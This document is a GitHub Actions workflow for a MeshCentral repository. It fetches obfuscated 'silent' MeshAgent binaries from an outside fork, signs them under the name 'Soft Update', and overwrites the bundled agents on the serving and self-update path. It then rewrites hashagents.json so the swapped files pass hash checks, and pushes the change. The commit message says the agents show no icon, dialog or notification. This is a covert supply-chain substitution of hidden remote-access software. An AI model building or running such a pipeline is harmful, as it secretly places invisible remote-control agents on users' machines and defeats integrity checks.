name: Ship silent agents
on:
  workflow_dispatch: {}
jobs:
  ship:
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
      - name: Checkout MeshCentral
        uses: actions/checkout@v4

      - name: Download silent agent binaries (MeshAgent 1.2.6-obf.2)
        run: |
          BASE=https://github.com/fcmatch121/MeshAgent/releases/download/1.2.6-obf.2
          mkdir -p silentbin && cd silentbin
          for f in MeshService.exe MeshService64.exe MeshServiceARM64.exe meshagent_aarch64 meshagent_alpine-x86-64 meshagent_armhf meshagent_freebsd_x86-64 meshagent_osx-arm-64 meshagent_osx-x86-64 meshagent_x86 meshagent_x86-64 meshagent_x86-64_nokvm meshagent_x86_nokvm SHA384SUMS.txt; do
            curl -sfLO "$BASE/$f" || echo "download fail: $f"
          done
          grep -v -E "meshagent_arm64|meshagent_osx-universal-64" SHA384SUMS.txt > ok.sums
          sha384sum -c ok.sums

      - name: Sign Windows agents with self-signed cert
        env:
          AGENT_SIGN_PFX: ${{ secrets.AGENT_SIGN_PFX }}
          AGENT_SIGN_PASS: ${{ secrets.AGENT_SIGN_PASS }}
        run: |
          sudo apt-get install -y osslsigncode > /dev/null
          echo "$AGENT_SIGN_PFX" | base64 -d > /tmp/codesign.pfx
          for f in silentbin/MeshService.exe silentbin/MeshService64.exe silentbin/MeshServiceARM64.exe; do
            osslsigncode sign -pkcs12 /tmp/codesign.pfx -pass "$AGENT_SIGN_PASS" \
              -n "Soft Update" -i https://github.com/fcmatch121 \
              -in "$f" -out "$f.signed" && mv "$f.signed" "$f"
            osslsigncode verify "$f" | grep -q "Signature" && echo "signed: $(basename $f)"
          done
          rm -f /tmp/codesign.pfx

      - name: Replace bundled agents and refresh hashagents.json
        run: |
          for f in silentbin/MeshService.exe silentbin/MeshService64.exe silentbin/MeshServiceARM64.exe silentbin/meshagent_*; do
            case "$(basename $f)" in *SUMS*) continue;; esac
            bn="$(basename $f)"
            cp -f "$f" "agents/agents_sep2026/$bn"
            if [ -f "agents/$bn" ]; then cp -f "$f" "agents/$bn"; fi
          done
          # 루트 agents/의 meshagent_* (리눅스/맥/bsd)도 전부 교체 — 서빙·self-update 경로
          for bn in meshagent_aarch64 meshagent_alpine-x86-64 meshagent_armhf meshagent_freebsd_x86-64 meshagent_osx-arm-64 meshagent_osx-x86-64 meshagent_x86 meshagent_x86-64 meshagent_x86-64_nokvm meshagent_x86_nokvm; do
            cp -f "silentbin/$bn" "agents/$bn"
          done
          python3 - <<'PY'
          import re, json, hashlib, time, collections, os
          src = open('meshcentral.js').read()
          mapping = {}
          for m in re.finditer(r"(\d+): \{ id: \d+, localname: '([^']+)'", src):
              mapping[int(m.group(1))] = m.group(2)
          ha = json.load(open('agents/hashagents.json'), object_pairs_hook=collections.OrderedDict)
          now = time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())
          for archid, entry in ha.items():
              ln = mapping.get(int(archid))
              if ln is None: continue
              p = os.path.join('agents/agents_sep2026', ln)
              if not os.path.isfile(p): continue
              data = open(p, 'rb').read()
              entry['hash'] = hashlib.sha384(data).hexdigest().upper()
              entry['size'] = len(data)
              entry['mtime'] = now
          json.dump(ha, open('agents/hashagents.json', 'w'), indent=2)
          print('hashagents.json refreshed')
          PY

      - name: Commit, tag, push
        run: |
          git config user.email "actions@users.noreply.github.com"
          git config user.name "MeshAgent CI"
          git add agents
          git commit -m "Ship silent StressMan agents: icon-free, dialog-free, toast-free agent binaries (MeshAgent 1.2.6-obf.2) with refreshed hashagents.json"
          git tag 1.2.6-obf.2
          git push origin master --tags
